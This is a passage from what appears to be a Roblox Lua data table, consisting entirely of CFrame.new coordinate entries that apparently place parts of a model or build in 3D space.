CFrame.new(1.2348361015319824, -2.9999992847442627, -8.734833717346191),
CFrame.new(3.2348363399505615, -4.999998569488525, -7.234835624694824),
CFrame.new(-1.265164852142334, -0.49999916553497314, -3.234834909439087),
CFrame.new(1.134833812713623, 1.9294102191925049, 8.648130416870117),
CFrame.new(2.7348344326019287, 1.5000009536743164, -1.2348353862762451),
CFrame.new(0.23483513295650482, -1.4999996423721313, -4.734834671020508),
CFrame.new(4.734834671020508, -0.9999987483024597, 1.7651644945144653),
CFrame.new(2.2348344326019287, 0.5, -1.2348353862762451),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(4.234834671020508, -0.49999725818634033, -3.234834909439087),
CFrame.new(5.734835624694824, -2.6999971866607666, -0.8348362445831299),
CFrame.new(1.2348361015319824, -3.2928929328918457, -8.941941261291504),
CFrame.new(-2.265164613723755, 2.4999992847442627, -2.234834671020508),
CFrame.new(-1.7651629447937012, -2.500000238418579, -0.23483578860759735),
CFrame.new(0.23483608663082123, -2.999999761581421, -3.234834909439087),
CFrame.new(-2.265162706375122, -5.000000476837158, -4.234835624694824),
CFrame.new(5.734832763671875, 3.000001907348633, 0.7651643753051758),
CFrame.new(-1.765164852142334, 2.4999992847442627, -0.23483578860759735),
CFrame.new(4.234834671020508, 1.5000009536743164, -4.234834671020508),
CFrame.new(5.234836578369141, -4.999998092651367, -2.734834909439087),
CFrame.new(4.234834671020508, -0.49999773502349854, -4.234835624694824),
CFrame.new(-2.265162706375122, -5.000000476837158, -6.234835624694824),
CFrame.new(4.234834671020508, 2.0000011920928955, 4.765165328979492),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -3.234834909439087),
CFrame.new(-0.7651649713516235, 0.9999995827674866, -4.234834671020508),
CFrame.new(4.234834671020508, 1.5000009536743164, 2.7651655673980713),
CFrame.new(4.234834671020508, 0.5000019073486328, 2.7651655673980713),
CFrame.new(4.734834671020508, 1.000001311302185, 0.7651643753051758),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(1.7348361015319824, -5, -4.234835624694824),
CFrame.new(5.234834671020508, -1.999997854232788, -3.234834909439087),
CFrame.new(5.734834671020508, -0.49999797344207764, -8.734833717346191),
CFrame.new(0.7348340749740601, 1.5, 1.7651644945144653),
CFrame.new(-0.7651630640029907, -2.6999995708465576, -0.8348362445831299),
CFrame.new(2.2348363399505615, -2.9999992847442627, -3.234834909439087),
CFrame.new(0.23483513295650482, 1.5000009536743164, -4.234834671020508),
CFrame.new(-0.7651630640029907, -2.6999995708465576, 2.1651651859283447),
CFrame.new(4.234836578369141, -4.999998092651367, -2.734834909439087),
CFrame.new(4.234834671020508, 2.0000011920928955, 0.7651643753051758),
CFrame.new(-1.265164852142334, 1.9999991655349731, 4.765165328979492),
CFrame.new(3.2348344326019287, 1.000001311302185, -4.734834671020508),
CFrame.new(-2.265164613723755, 1.4999979734420776, 0.7651643753051758),
CFrame.new(-1.265164852142334, 0.5000007152557373, -3.234834909439087),
CFrame.new(-1.265164852142334, -0.49999964237213135, 1.7651644945144653),
CFrame.new(-1.765164852142334, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -2.000000238418579, -4.234835624694824),
CFrame.new(4.234836578369141, -2.9999983310699463, -4.234835624694824),
CFrame.new(-2.7651665210723877, 2.9999983310699463, -1.234834909439087),
CFrame.new(5.234834671020508, -0.9999977946281433, -4.734834671020508),
CFrame.new(-0.7651668787002563, 2.9999988079071045, 0.7651643753051758),
CFrame.new(2.2348363399505615, -2.9999992847442627, -3.234834909439087),
CFrame.new(1.2348361015319824, -1.9999992847442627, -4.734835624694824),
CFrame.new(3.7348363399505615, -2.699998140335083, -1.8348363637924194),
CFrame.new(-0.7651649713516235, 0.9999991059303284, 2.765164613723755),
CFrame.new(4.734833717346191, 2.5000011920928955, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -1.000001072883606, 2.765164613723755),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(-0.26516294479370117, -2.6999995708465576, -1.8348363637924194),
CFrame.new(3.2348344326019287, -0.9999987483024597, -4.734834671020508),
CFrame.new(4.734834671020508, 1.0000017881393433, -3.234834671020508),
CFrame.new(4.734834671020508, 2.0000011920928955, 0.7651643753051758),
CFrame.new(-1.265164852142334, 1.9999991655349731, -2.234834671020508),
CFrame.new(5.734833717346191, 1.0000015497207642, 2.765164613723755),
CFrame.new(-0.7651630640029907, -2.999999761581421, -8.734833717346191),
CFrame.new(0.23483704030513763, -5, -2.734834909439087),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -0.23483578860759735),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(5.234832763671875, 2.5000011920928955, -3.234834671020508),
CFrame.new(4.234834671020508, 0.000002339482307434082, -0.23483578860759735),
CFrame.new(4.234834671020508, 0.5000028610229492, -3.234834909439087),
CFrame.new(4.234836578369141, -2.4999983310699463, -4.734835624694824),
CFrame.new(1.134833812713623, 1.9294102191925049, 7.648129940032959),
CFrame.new(-0.7651630640029907, -2.000000238418579, -4.734835624694824),
CFrame.new(4.734834671020508, -0.9999982714653015, -0.23483578860759735),
CFrame.new(2.2348363399505615, -3.2928924560546875, -8.941941261291504),
CFrame.new(4.734834671020508, -0.49999821186065674, -4.734834671020508),
CFrame.new(3.734832525253296, 3.0000014305114746, -0.23483578860759735),
CFrame.new(-1.7651629447937012, -1.5000011920928955, 2.765164613723755),
CFrame.new(5.234834671020508, -1.4999982118606567, -3.234834909439087),
CFrame.new(-1.265164852142334, 1.999998688697815, 1.7651644945144653),
CFrame.new(4.734834671020508, 0.5000009536743164, 3.2651658058166504),
CFrame.new(2.2348344326019287, 0.5, -1.2348353862762451),
CFrame.new(5.234834671020508, -2.499997854232788, -3.234834909439087),
CFrame.new(4.734834671020508, -0.9999982714653015, -3.234834909439087),
CFrame.new(4.234834671020508, 2.5000011920928955, 2.7651655673980713),
CFrame.new(4.234834671020508, 1.0000008344650269, 3.265164852142334),
CFrame.new(0.23483704030513763, -2.4999992847442627, -4.734835624694824),
CFrame.new(-0.8651653528213501, 1.9294092655181885, 8.648130416870117),
CFrame.new(-1.7651629447937012, -5.000000476837158, -7.234835624694824),
CFrame.new(-1.7651629447937012, -2.500000238418579, -1.2348358631134033),
CFrame.new(-1.765164852142334, 0.9999993443489075, -8.734833717346191),
CFrame.new(3.2348363399505615, -4.999999523162842, -3.234835147857666),
CFrame.new(3.7348344326019287, 2, 3.265164852142334),
CFrame.new(-0.7651630640029907, -2.6999995708465576, 0.16516387462615967),
CFrame.new(4.134834289550781, 1.9294111728668213, 7.648129940032959),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -2.234834909439087),
CFrame.new(4.734834671020508, 1.5000015497207642, -3.234834671020508),
CFrame.new(5.234834671020508, -2.4999983310699463, 1.7651644945144653),
CFrame.new(4.234834671020508, 2.5000016689300537, -2.234834671020508),
CFrame.new(0.13483475148677826, 1.9294092655181885, 7.148129940032959),
CFrame.new(5.234834671020508, -1.4999982118606567, -4.234835624694824),
CFrame.new(-0.265164852142334, 1.5000004768371582, -3.2348344326019287),
CFrame.new(4.234834671020508, 2.5000011920928955, 0.7651643753051758),
CFrame.new(1.134833812713623, 0.800000011920929, 5.165163040161133),
CFrame.new(-1.265164852142334, 1.9999991655349731, -0.23483578860759735),
CFrame.new(2.2348363399505615, -2.9999992847442627, -3.734834909439087),
CFrame.new(-1.265164852142334, 1.9999991655349731, -3.234834671020508),
CFrame.new(-1.765164852142334, 0.9999991059303284, -4.234834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, 2.1651651859283447),
CFrame.new(-1.765164852142334, 0.9999986290931702, 1.7651644945144653),
CFrame.new(4.734834671020508, 2.0000016689300537, -4.234834671020508),
CFrame.new(2.134834051132202, 1.9294102191925049, 8.148130416870117),
CFrame.new(4.734834671020508, 1.000001311302185, 1.7651644945144653),
CFrame.new(0.23483704030513763, -4.707106113433838, -7.527728080749512),
CFrame.new(3.2348363399505615, -3.2928919792175293, -8.941941261291504),
CFrame.new(-1.765164852142334, 1.499998927116394, -0.23483578860759735),
CFrame.new(0.23483608663082123, -3.2928929328918457, -8.941941261291504),
CFrame.new(-0.26516294479370117, -2.6999995708465576, 1.1651639938354492),
CFrame.new(1.2348341941833496, 1.5000004768371582, 0.7651643753051758),
CFrame.new(5.734833717346191, 1.0000020265579224, -4.234834671020508),
CFrame.new(1.2348361015319824, -1.4999991655349731, -4.734834671020508),
CFrame.new(-1.7651629447937012, -1.000001072883606, 1.7651644945144653),
CFrame.new(3.734832525253296, 3.0000009536743164, -3.234834671020508),
CFrame.new(2.2348363399505615, -4.999999046325684, -7.234835624694824),
CFrame.new(5.234834671020508, -0.9999982714653015, -2.234834909439087),
CFrame.new(2.2348344326019287, -0.9999992251396179, -4.734834671020508),
CFrame.new(4.234834671020508, 2.5000011920928955, -1.234834909439087),
CFrame.new(0.23483513295650482, 1.5, -1.2348353862762451),
CFrame.new(4.234836578369141, -4.999998092651367, -7.234835624694824),
CFrame.new(1.134833812713623, 1.9294100999832153, 6.648129463195801),
CFrame.new(4.234834671020508, 2.0000011920928955, -2.234834671020508),
CFrame.new(-1.265164852142334, 0.4999997615814209, 2.7651655673980713),
CFrame.new(0.23483608663082123, -2.999999761581421, -3.234834909439087),
CFrame.new(5.734835624694824, -4.353551387786865, -7.881281852722168),
CFrame.new(5.234833717346191, 1.0000020265579224, -4.734834671020508),
CFrame.new(-1.7651629447937012, -3.292893886566162, -8.941941261291504),
CFrame.new(5.734832763671875, 2.5000011920928955, 3.2651658058166504),
CFrame.new(4.234836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(-1.265164852142334, 0.9999991059303284, 3.7651658058166504),
CFrame.new(5.234835624694824, -3.292891025543213, -8.941941261291504),
CFrame.new(4.234834671020508, -0.49999773502349854, -2.234835147857666),
CFrame.new(-2.265164613723755, 1.499998927116394, -3.234834671020508),
CFrame.new(-1.7651629447937012, -4.707107067108154, -7.527728080749512),
CFrame.new(3.734832525253296, 3.0000014305114746, -4.234834671020508),
CFrame.new(-2.265164613723755, 1.4999979734420776, 2.7651655673980713),
CFrame.new(-0.7651649713516235, 2.499999761581421, -4.734834671020508),
CFrame.new(-2.765164613723755, 0.9999983906745911, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -5.000000476837158, -5.234834671020508),
CFrame.new(1.2348341941833496, 0.5, -0.7348358035087585),
CFrame.new(3.2348363399505615, -2.9999988079071045, -4.234835624694824),
CFrame.new(1.134833812713623, 1.4294102191925049, 9.148130416870117),
CFrame.new(5.234832763671875, 2.5000011920928955, 0.7651643753051758),
CFrame.new(-1.265164852142334, 2.4999992847442627, 4.265164375305176),
CFrame.new(0.23483513295650482, 1.5, 1.7651644945144653),
CFrame.new(3.134834051132202, 1.429410696029663, 9.148130416870117),
CFrame.new(-1.265164852142334, 0.5000002384185791, -0.23483578860759735),
CFrame.new(4.734834671020508, 0.000001862645149230957, -4.734834671020508),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(0.7348369359970093, -2.6999990940093994, 0.16516387462615967),
CFrame.new(-1.765164852142334, 0.9999986290931702, -1.2348353862762451),
CFrame.new(-2.265162706375122, -4.500001430511475, -3.2348341941833496),
CFrame.new(4.134834289550781, 0.3669886589050293, 4.915163993835449),
CFrame.new(4.234836578369141, -4.707104682922363, -7.527728080749512),
CFrame.new(4.234834671020508, 0.000001862645149230957, 2.765164613723755),
CFrame.new(4.234834671020508, 2.0000011920928955, 0.7651643753051758),
CFrame.new(4.234835624694824, -1.9999983310699463, -4.734835624694824),
CFrame.new(4.734836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(-2.265164613723755, 1.9999982118606567, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -2.5000011920928955, 0.7651643753051758),
CFrame.new(-0.7651630640029907, -2.6999995708465576, 0.16516387462615967),
CFrame.new(5.234833717346191, 2.0000011920928955, 0.7651643753051758),
CFrame.new(5.234834671020508, -1.4999977350234985, -4.734834671020508),
CFrame.new(1.2348341941833496, 4.3213367462158203e-07, -4.734834671020508),
CFrame.new(-2.765164613723755, 1.9999991655349731, -4.734834671020508),
CFrame.new(4.734833717346191, 2.5000016689300537, -0.23483578860759735),
CFrame.new(-1.765164852142334, 1.9999991655349731, -2.234834671020508),
CFrame.new(-0.7651649713516235, 1.5, 0.7651643753051758),
CFrame.new(1.7348341941833496, 1.0000001192092896, -1.2348353862762451),
CFrame.new(4.134834289550781, 0.9294111728668213, 9.648130416870117),
CFrame.new(1.134833812713623, 1.9294102191925049, 7.148129940032959),
CFrame.new(-1.7651629447937012, -2.0000011920928955, 1.7651644945144653),
CFrame.new(3.134834051132202, 1.929410696029663, 8.148130416870117),
CFrame.new(5.734833717346191, 1.0000015497207642, 0.7651643753051758),
CFrame.new(0.23483704030513763, -4.999999523162842, -7.234835624694824),
CFrame.new(-2.265164613723755, 2.4999992847442627, -0.23483578860759735),
CFrame.new(3.134834051132202, 0.4294106960296631, 10.148130416870117),
CFrame.new(5.734832763671875, 3.000002384185791, 1.7651644945144653),
CFrame.new(4.234836578369141, -2.699997663497925, -2.8348355293273926),
CFrame.new(4.234834671020508, 2.5000016689300537, 4.265164375305176),
CFrame.new(3.734832525253296, 3.0000014305114746, -2.2348344326019287),
CFrame.new(-1.265164852142334, -0.49999964237213135, -0.23483578860759735),
CFrame.new(5.734832763671875, 2.500002145767212, -4.734834671020508),
CFrame.new(-2.765164613723755, 0.9999988675117493, -2.234834909439087),
CFrame.new(-0.7651649713516235, 1.5, -3.2348344326019287),
CFrame.new(-0.7651649713516235, 0.9999995827674866, -0.23483578860759735),
CFrame.new(4.734834671020508, 2.0000011920928955, 0.7651643753051758),
CFrame.new(4.734834671020508, 1.5000009536743164, -1.234834909439087),
CFrame.new(-1.265164852142334, 2.4999988079071045, -3.234834671020508),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -0.23483578860759735),
CFrame.new(1.234835147857666, -0.9999992251396179, -4.734834671020508),
CFrame.new(0.7348369359970093, -2.6999990940093994, 1.1651639938354492),
CFrame.new(5.234834671020508, -1.9999983310699463, 0.7651643753051758),
CFrame.new(-1.765164852142334, 1.9999982118606567, 0.7651643753051758),
CFrame.new(5.234835624694824, -2.6999971866607666, -1.8348363637924194),
CFrame.new(4.734833717346191, 2.5000016689300537, 1.7651644945144653),
CFrame.new(-2.265162706375122, -2.700000047683716, 0.16516387462615967),
CFrame.new(1.134833812713623, 1.8000003099441528, 6.165164947509766),
CFrame.new(-1.765164852142334, 2.4999992847442627, -4.234834671020508),
CFrame.new(4.234836578369141, -3.292891502380371, -8.941941261291504),
CFrame.new(-0.8651653528213501, 1.9294092655181885, 7.648129940032959),
CFrame.new(4.734834671020508, 2.0000016689300537, -3.234834671020508),
CFrame.new(5.234832763671875, 2.5000016689300537, 1.7651644945144653),
CFrame.new(-0.7651668787002563, 2.9999988079071045, 2.765164613723755),
CFrame.new(-1.765164852142334, 1.499998927116394, -4.234834671020508),
CFrame.new(5.234834671020508, 0.5000019073486328, -4.734834671020508),
CFrame.new(0.23483513295650482, 1.0000003576278687, -8.734833717346191),
CFrame.new(4.234834671020508, 1.5000009536743164, -2.234834671020508),
CFrame.new(-2.765164613723755, 1.9999982118606567, 3.265164852142334),
CFrame.new(5.234836578369141, -4.707104682922363, -7.527728080749512),
CFrame.new(-1.7651629447937012, -2.0000011920928955, 2.7651655673980713),
CFrame.new(-2.265164613723755, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-2.265162706375122, -5.000000476837158, -3.234835147857666),
CFrame.new(3.2348344326019287, 0.5000011920928955, -4.734834671020508),
CFrame.new(4.234834671020508, 1.0000017881393433, -8.734833717346191),
CFrame.new(-1.765164852142334, 2.4999992847442627, -2.234834671020508),
CFrame.new(5.734834671020508, -1.9999973773956299, -8.734833717346191),
CFrame.new(5.734833717346191, 1.0000015497207642, -1.2348353862762451),
CFrame.new(4.234836578369141, -4.999998092651367, -4.734835624694824),
CFrame.new(5.734832763671875, 3.000002384185791, -4.234834671020508),
CFrame.new(1.7348361015319824, -5, -5.734834671020508),
CFrame.new(-2.265164613723755, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-2.7651665210723877, 2.9999988079071045, -0.23483578860759735),
CFrame.new(-1.7651629447937012, -2.000000238418579, -3.234834909439087),
CFrame.new(-1.765164852142334, 1.9999982118606567, 1.7651644945144653),
CFrame.new(1.7348361015319824, -5, -3.734834909439087),
CFrame.new(3.7348344326019287, 1.0000008344650269, 2.765164613723755),
CFrame.new(2.134834051132202, 1.9294102191925049, 7.648129940032959),
CFrame.new(4.234834671020508, 1.0000017881393433, -4.734834671020508),
CFrame.new(1.7348361015319824, -5, -3.234835147857666),
CFrame.new(3.2348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(5.234835624694824, -2.999997854232788, -3.234834909439087),
CFrame.new(-2.265164613723755, 1.9999991655349731, -2.234834671020508),
CFrame.new(5.234834671020508, -1.999997854232788, -4.234835624694824),
CFrame.new(-0.7651668787002563, 2.9999992847442627, -0.23483578860759735),
CFrame.new(5.234832763671875, 2.5000016689300537, -0.23483578860759735),
CFrame.new(2.7348363399505615, -2.699998140335083, 2.1651651859283447),
CFrame.new(5.234832763671875, 2.5000011920928955, 0.7651643753051758),
CFrame.new(3.134834051132202, 1.929410696029663, 7.648129940032959),
CFrame.new(3.134834051132202, 1.8000012636184692, 6.165164947509766),
CFrame.new(3.2348363399505615, -4.999998569488525, -5.234834671020508),
CFrame.new(5.234833717346191, 2.0000011920928955, -1.234834909439087),
CFrame.new(-0.7651630640029907, -3.000000476837158, -3.234834909439087),
CFrame.new(-2.765164613723755, 0.9999983906745911, 1.7651644945144653),
CFrame.new(-2.7651665210723877, 2.9999983310699463, 2.765164613723755),
CFrame.new(5.734835624694824, -4.499998569488525, -3.234835147857666),
CFrame.new(-1.265164852142334, 1.999998688697815, -1.234834909439087),
CFrame.new(0.13483475148677826, 1.4294092655181885, 9.148130416870117),
CFrame.new(5.734834671020508, -3.9999985694885254, -3.234835147857666),
CFrame.new(5.234834671020508, -1.999997854232788, -4.734834671020508),
CFrame.new(-1.265164852142334, -0.49999964237213135, -4.234835624694824),
CFrame.new(4.234834671020508, 0.000002339482307434082, 1.7651644945144653),
CFrame.new(-2.265162706375122, -3.5000014305114746, -3.234835147857666),
CFrame.new(1.2348341941833496, 1.5000009536743164, -0.23483578860759735),
CFrame.new(3.2348363399505615, -1.9999983310699463, -4.734835624694824),
CFrame.new(4.234834671020508, 0.500002384185791, 1.7651644945144653),
CFrame.new(2.134834051132202, 0.8000002503395081, 5.165163040161133),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, -0.23483578860759735),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -4.234835624694824),
CFrame.new(3.7348344326019287, 1.5, 3.2651658058166504),
CFrame.new(-1.765164852142334, 1.9999982118606567, 0.7651643753051758),
CFrame.new(4.234836578369141, -4.999999046325684, -3.234835147857666),
CFrame.new(1.7348361015319824, -5, -6.234835624694824),
CFrame.new(-2.265162706375122, -4.500001430511475, -3.2348341941833496),
CFrame.new(5.234832763671875, 2.5000016689300537, -4.234834671020508),
CFrame.new(-1.265164852142334, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-0.7651630640029907, -2.6999995708465576, -2.8348355293273926),
CFrame.new(2.2348344326019287, -4.4703611479235406e-08, -1.2348353862762451),
CFrame.new(5.234833717346191, 2.0000016689300537, -3.234834671020508),
CFrame.new(5.734833717346191, 1.0000020265579224, -3.234834671020508),
CFrame.new(5.734833717346191, 1.0000015497207642, 1.7651644945144653),
CFrame.new(-1.265164852142334, 1.999998688697815, 0.7651643753051758),
CFrame.new(1.2348361015319824, -5, -3.234835147857666),
CFrame.new(-2.765164613723755, 0.9999983906745911, 2.765164613723755),
CFrame.new(3.2348363399505615, -4.999999046325684, -4.734835624694824),
CFrame.new(3.2348363399505615, -2.9999983310699463, -8.734833717346191),
CFrame.new(0.23483704030513763, -5.000000476837158, -3.234835147857666),
CFrame.new(3.134834051132202, 0.8000007271766663, 5.165163040161133),
CFrame.new(2.2348363399505615, -5, -3.234835147857666),
CFrame.new(-0.7651649713516235, -0.5000001192092896, -4.734834671020508),
CFrame.new(4.734834671020508, 1.0000017881393433, -4.234834671020508),
CFrame.new(-2.7651665210723877, 2.9999988079071045, 1.7651644945144653),
CFrame.new(2.134834051132202, 0.366987943649292, 4.915163993835449),
CFrame.new(4.134834289550781, 0.4294111728668213, 10.148130416870117),
CFrame.new(3.2348344326019287, -0.9999987483024597, -8.734833717346191),
CFrame.new(3.7348344326019287, 1.0000008344650269, -1.2348353862762451),
CFrame.new(2.2348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(-1.265164852142334, -0.5000001192092896, 2.765164613723755),
CFrame.new(5.234833717346191, 2.0000011920928955, 0.7651643753051758),
CFrame.new(2.2348344326019287, 1.000001072883606, -8.734833717346191),
CFrame.new(-1.7651629447937012, -2.700000047683716, 1.1651639938354492),
CFrame.new(-1.765164852142334, 1.4999979734420776, 0.7651643753051758),
CFrame.new(-0.7651668787002563, 2.9999992847442627, 1.7651644945144653),
CFrame.new(2.2348344326019287, 1.5000009536743164, 2.7651655673980713),
CFrame.new(2.2348344326019287, -0.49999964237213135, -1.2348353862762451),
CFrame.new(3.734832525253296, 3.0000014305114746, 1.7651644945144653),
CFrame.new(0.23483513295650482, -0.9999997019767761, -8.734833717346191),
CFrame.new(-2.265162706375122, -4.000001430511475, -3.234835147857666),
CFrame.new(0.23483513295650482, -2.999999761581421, -8.734833717346191),
CFrame.new(2.7348344326019287, 1.5000015497207642, -0.23483578860759735),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -4.234835624694824),
CFrame.new(-2.265164613723755, 1.4999979734420776, -1.234834909439087),
CFrame.new(-2.265162706375122, -2.0000007152557373, -8.734833717346191),
CFrame.new(-1.7651629447937012, -2.700000047683716, -2.8348355293273926),
CFrame.new(1.7348341941833496, -4.4703583057525975e-08, -1.2348353862762451),
CFrame.new(2.2348344326019287, -4.4703611479235406e-08, -1.2348353862762451),
CFrame.new(-1.7651629447937012, -5.000001430511475, -3.234835147857666),
CFrame.new(-0.265164852142334, 1.5, -1.2348353862762451),
CFrame.new(5.734834671020508, -3.499998092651367, -3.234835147857666),
CFrame.new(-2.265162706375122, -4.000001430511475, -3.234835147857666),
CFrame.new(4.734834671020508, 9.089706622944504e-07, 3.265164852142334),
CFrame.new(1.134833812713623, 1.2330127954483032, 5.415163993835449),
CFrame.new(-1.265164852142334, 2.4999992847442627, 1.7651644945144653),
CFrame.new(4.734834671020508, 2.0000011920928955, 2.765164613723755),
CFrame.new(-2.265164613723755, 2.4999992847442627, -4.234834671020508),
CFrame.new(5.734833717346191, 1.5000020265579224, -4.734834671020508),
CFrame.new(1.134833812713623, 1.9294102191925049, 8.148130416870117),
CFrame.new(-2.265164613723755, 2.4999988079071045, 2.7651655673980713),
CFrame.new(2.2348363399505615, -2.699998617172241, 0.16516387462615967),
CFrame.new(3.2348344326019287, 1.5000020265579224, -2.234834909439087),
CFrame.new(2.7348344326019287, 1.5000015497207642, -4.234834671020508),
CFrame.new(-1.265164852142334, 1.499998927116394, -3.234834671020508),
CFrame.new(-0.7651649713516235, 2.4999988079071045, 3.2651658058166504),
CFrame.new(5.234835624694824, -2.999997854232788, -3.234834909439087),
CFrame.new(4.734834671020508, 1.5000015497207642, -4.234834671020508),
CFrame.new(-0.7651630640029907, -3.000000476837158, -3.234834909439087),
CFrame.new(5.234834671020508, -1.9999983310699463, 1.7651644945144653),
CFrame.new(0.23483704030513763, -4.999999523162842, -5.234834671020508),
CFrame.new(-2.265162706375122, -4.353553771972656, -7.881280899047852),
CFrame.new(4.734833717346191, 2.5000011920928955, -1.234834909439087),
CFrame.new(-2.265164613723755, 2.4999992847442627, 1.7651644945144653),
CFrame.new(5.234834671020508, -0.9999977946281433, -8.734833717346191),
CFrame.new(-1.2651629447937012, -2.700000047683716, -2.8348355293273926),
CFrame.new(5.234834671020508, -2.49999737739563, -4.734834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, 1.1651639938354492),
CFrame.new(-2.765164613723755, 1.4999979734420776, 3.2651658058166504),
CFrame.new(4.734833717346191, 2.5000016689300537, -2.234834671020508),
CFrame.new(0.7348340749740601, 1.5000009536743164, -0.23483578860759735),
CFrame.new(-2.265164613723755, 1.9999991655349731, -3.234834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, -0.8348362445831299),
CFrame.new(4.134834289550781, 1.9294111728668213, 8.648130416870117),
CFrame.new(1.2348341941833496, -0.49999964237213135, -4.734834671020508),
CFrame.new(-1.765164852142334, 1.9999982118606567, 2.765164613723755),
CFrame.new(1.134833812713623, 1.8000003099441528, 6.165164947509766),
CFrame.new(-1.765164852142334, -0.5000005960464478, -4.734835624694824),
CFrame.new(-1.765164852142334, -0.0000014752150718777557, 3.265164852142334),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, 1.7651644945144653),
CFrame.new(4.734834671020508, -0.9999982714653015, -2.234834909439087),
CFrame.new(5.234835624694824, -2.6999971866607666, 1.1651639938354492),
CFrame.new(1.2348341941833496, 0.5000004768371582, -4.734834671020508),
CFrame.new(4.234834671020508, 2.0000011920928955, 1.7651644945144653),
CFrame.new(1.7348341941833496, -4.4703583057525975e-08, -1.2348353862762451),
CFrame.new(-1.265164852142334, -0.49999964237213135, 0.7651643753051758),
CFrame.new(4.134834289550781, 1.9294110536575317, 6.648129463195801),
CFrame.new(4.234835624694824, -1.4999982118606567, -4.734834671020508),
CFrame.new(0.13483475148677826, 1.7999998331069946, 6.165164947509766),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, -1.2348353862762451),
CFrame.new(-0.7651668787002563, 2.9999988079071045, -1.234834909439087),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -3.234834909439087),
CFrame.new(4.234834671020508, -0.9999982714653015, -4.734834671020508),
CFrame.new(-0.7651630640029907, -5, -5.234834671020508),
CFrame.new(3.7348344326019287, 2.0000011920928955, -4.734834671020508),
CFrame.new(-0.8651653528213501, 1.7999993562698364, 6.165165901184082),
CFrame.new(1.7348341941833496, 1.5000009536743164, -4.234834671020508),
CFrame.new(3.734832525253296, 3.0000009536743164, 0.7651643753051758),
CFrame.new(-1.265164852142334, 1.499998927116394, -0.23483578860759735),
CFrame.new(3.7348344326019287, 2.5000007152557373, 3.2651658058166504),
CFrame.new(4.234834671020508, 2.0000011920928955, -3.234834671020508),
CFrame.new(5.734832763671875, 3.000001907348633, -3.234834671020508),
CFrame.new(4.234834671020508, 2.5000016689300537, 1.7651644945144653),
CFrame.new(4.734833717346191, 2.5000011920928955, -3.234834671020508),
CFrame.new(5.234833717346191, 1.5000015497207642, -4.234834671020508),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(5.734833717346191, 2.0000011920928955, 3.265164852142334),
CFrame.new(5.234833717346191, 1.5000015497207642, -2.234834671020508),
CFrame.new(4.734834671020508, -0.9999982714653015, -1.2348353862762451),
CFrame.new(5.234835624694824, -2.6999971866607666, 0.16516387462615967),
CFrame.new(4.734834671020508, -0.49999916553497314, 3.2651658058166504),
CFrame.new(-1.265164852142334, -0.49999964237213135, -2.234835147857666),
CFrame.new(1.7348341941833496, 1.5000009536743164, -1.2348353862762451),
CFrame.new(-2.265162706375122, -2.700000047683716, -2.8348355293273926),
CFrame.new(-1.265164852142334, -4.470341252726939e-08, 2.765164613723755),
CFrame.new(-1.765164852142334, 2.4999988079071045, -3.234834671020508),
CFrame.new(-1.7651629447937012, -2.000000238418579, -4.734835624694824),
CFrame.new(-1.7651629447937012, -5.000000476837158, -4.734835624694824),
CFrame.new(1.2348341941833496, -0.5000001192092896, -1.2348353862762451),
CFrame.new(-1.765164852142334, 1.9999991655349731, -3.234834671020508),
CFrame.new(3.7348344326019287, 1.000001311302185, -4.234834671020508),
CFrame.new(0.7348340749740601, 1.5000009536743164, -4.234834671020508),
CFrame.new(5.734834671020508, -2.6999971866607666, 2.1651651859283447),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -1.000001072883606, 0.7651643753051758),
CFrame.new(2.7348363399505615, -2.699998140335083, 1.1651639938354492),
CFrame.new(2.7348363399505615, -2.699998140335083, -0.8348362445831299),
CFrame.new(5.734835624694824, -2.6999971866607666, 0.16516387462615967),
CFrame.new(-0.265164852142334, 1.5, 2.7651655673980713),
CFrame.new(-1.265164852142334, 0.5000002384185791, -1.2348353862762451),
CFrame.new(3.7348344326019287, 1.000001311302185, -2.234834909439087),
CFrame.new(-1.765164852142334, 0.9999991059303284, -3.234834671020508),
CFrame.new(4.234834671020508, 2.5000016689300537, -0.23483578860759735),
CFrame.new(0.7348340749740601, 1.5000009536743164, -3.2348344326019287),
CFrame.new(-0.7651649713516235, 1.5, -2.234834909439087),
CFrame.new(3.7348344326019287, 1.000001311302185, -3.234834671020508),
CFrame.new(4.234834671020508, -0.49999749660491943, -0.23483578860759735),
CFrame.new(-0.7651630640029907, -1.0000001192092896, -8.734833717346191),
CFrame.new(-1.7651629447937012, -1.5000011920928955, 1.7651644945144653),
CFrame.new(1.7348361015319824, -4.999999523162842, -6.734835624694824),
CFrame.new(4.234834671020508, 0.500002384185791, -4.234835624694824),
CFrame.new(-1.265164852142334, 1.4999984502792358, -1.234834909439087),
CFrame.new(2.2348344326019287, 1.000001072883606, -4.734834671020508),
CFrame.new(-1.265164852142334, 0.5000002384185791, -4.234835624694824),
